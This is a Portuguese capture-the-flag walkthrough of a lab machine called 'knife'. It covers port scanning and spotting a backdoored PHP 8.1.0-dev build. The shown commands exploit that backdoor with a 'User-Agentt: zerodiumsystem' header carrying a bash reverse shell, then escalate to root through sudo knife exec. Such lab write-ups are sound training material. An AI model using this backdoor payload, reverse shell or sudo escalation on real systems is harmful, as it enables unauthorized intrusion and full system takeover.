#ctfs 

# Reconhecimento inicial

Primeiro vamos começar com um scan de portas a partir do IP fornecido

```shell
└─$ nmap 10.129.83.242 --open -Pn -p-                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-11 13:54 -03
Nmap scan report for 10.129.83.242
Host is up (0.26s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 43.62 seconds
```

Vamos aprofundar nosso scan nas portas 22 e 80

```shell
└─$ nmap 10.129.83.242 --open -Pn -p 22,80 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-11 13:56 -03
Nmap scan report for 10.129.83.242
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.48 seconds
```

Como temos uma porta 80 HTTP aberta, vamos abrir no navegador.
# Enumeração

## Serviço Web

Ao abrirmos o navegador nos deparamos com o seguinte site:

![Pagina inicial do site Emergent Medical Idea no navegador](Imagens/Pasted%20image%2020260911162022.png)

Ele não possui absolutamente nenhum link nem nada que nos redirecione a outra página, é simplesmente um template estático sem nenhuma referência, cabe a nós realizar uma enumeração de diretórios.


```shell
└─$ feroxbuster -u http://10.129.83.242/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -C 404 -x php,txt 
                                                                 
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.83.242/
 🚩  In-Scope Url          │ 10.129.83.242
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                            
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                            
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                            
200      GET      220l      526w     5815c http://10.129.83.242/
200      GET      220l      526w     5815c http://10.129.83.242/index.php
[###########>--------] - 19m   385197/661641  13m     found:2    🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_129_83_242_-1789156408.state ...
[###########>--------] - 19m   385208/661641  13m     found:2       errors:760    
[###########>--------] - 19m   386043/661635  339/s   http://10.129.83.242/  
```

Após um scan bem longo percebi que talvez não fosse esse o caminho correto, podemos agora explorarmos as tecnologias do site

# Exploração

```shell
└─$ whatweb http://10.129.83.242/              
http://10.129.83.242/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.83.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev] 
```

Observe a versão `PHP 8.1.0-dev`. Ao pesquisarmos na internet encontramos um exploit associado a ela https://www.exploit-db.com/exploits/49933

Após fazer uso do exploit conseguimos acesso remoto.

```shell
└─$ python3 49933.py                                     
Enter the full host url:
http://10.129.83.242

Interactive shell is opened on http://10.129.83.242 
Can't acces tty; job crontol turned off.
$ whoami
james
```

Após isso, podemos ler a flag no diretório do usuário.

```shell
$ ls -la /home/james
total 40
drwxr-xr-x 5 james james 4096 May 18  2021 .
drwxr-xr-x 3 root  root  4096 May  6  2021 ..
lrwxrwxrwx 1 james james    9 May 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Feb 25  2020 .bashrc
drwx------ 2 james james 4096 May  6  2021 .cache
drwxrwxr-x 3 james james 4096 May  6  2021 .local
-rw-r--r-- 1 james james  807 Feb 25  2020 .profile
-rw-rw-r-- 1 james james   66 May  7  2021 .selected_editor
drwx------ 2 james james 4096 May 18  2021 .ssh
-r-------- 1 james james   33 Sep 11 16:51 user.txt

$ cat /home/james/user.txt
[flag user.txt]
```

Conseguimos a primeira flag. Vamos escalar privilégios.

# Pós-exploração

## Escalação de privilégios

### Informações gerais do sistema

- Verificação da versão do Kernel

```shell
$ uname -a
Linux knife 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

- Leitura da `/etc/passwd` para vermos usuários do sistema

```shell
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
james:x:1000:1000:james:/home/james:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
opscode:x:997:997::/opt/opscode/embedded:/usr/sbin/nologin
opscode-pgsql:x:996:996::/var/opt/opscode/postgresql:/bin/sh

```

- Configurações de rede

```shell
$ ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                     
        inet 10.129.83.242  netmask 255.255.0.0  broadcast 10.129.255.255        
        inet6 fe80::a0de:adff:fe3b:b5b8  prefixlen 64  scopeid 0x20<link>        
        inet6 dead:beef::a0de:adff:fe3b:b5b8  prefixlen 64  scopeid 0x0<global>  
        ether a2:de:ad:3b:b5:b8  txqueuelen 1000  (Ethernet)                     
        RX packets 741578  bytes 115441126 (115.4 MB)                            
        RX errors 0  dropped 0  overruns 0  frame 0                              
        TX packets 683351  bytes 246235594 (246.2 MB)                            
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                                                                                       
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                     
        inet 127.0.0.1  netmask 255.0.0.0                                        
        inet6 ::1  prefixlen 128  scopeid 0x10<host>                             
        loop  txqueuelen 1000  (Local Loopback)                                  
        RX packets 2648826  bytes 306848772 (306.8 MB)                           
        RX errors 0  dropped 0  overruns 0  frame 0                              
        TX packets 2648826  bytes 306848772 (306.8 MB)                           
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0   
```

- Permissões do usuário

```shell
$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Interessante, temos uma pasta com `NOPASSWD`. Vamos investigar.

# Exploração final

Ao pesquisarmos sobre o `knife`, encontramos um código do [GTFOBins](https://gtfobins.org/gtfobins/knife/#inherit) ensinando a obter root via linha de comando `knife exec -E '...'`.

```shell
$ sudo knife exec --exec 'exec "/bin/sh"'
No input file specified.
```

Tentei diversas combinações de comandos possíveis e nada. Até que fui pesquisar e entender que mensagem de erro é essa.

O erro vem da própria Webshell que construímos, se você abrir o exploit verá que ele veio a partir da má escritura do "User-Agent" que virou "User-Agentt", ou seja, a shell que estávamos utilizando funcionou para ler o arquivo de flag de usuário, porém ela não era "estável" o bastante para conseguirmos executar comandos normais. Precisamos de uma shell reversa de verdade.

Com isso, ao invés de usarmos o exploit da internet, decidi usar o próprio `curl`para construir a requisição de shell reversa para minha máquina

```shell
└─$ curl -s -X POST \
  -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/[Meu IP]/4444 0>&1'\");" \
  http://10.129.83.242/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>504 Gateway Timeout</title>
</head><body>
<h1>Gateway Timeout</h1>
<p>The gateway did not receive a timely response
from the upstream server or application.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.129.83.242 Port 80</address>
</body></html>
```

O que nos retornou uma shell estável, basta executar o comando do `knife`e teremos root.

```shell
james@knife:/$ sudo knife exec --exec 'exec "/bin/sh"'
sudo knife exec --exec 'exec "/bin/sh"'
whoami
root
cat /root/root.txt
[flag root.txt]
```

E assim encerra-se nosso CTF.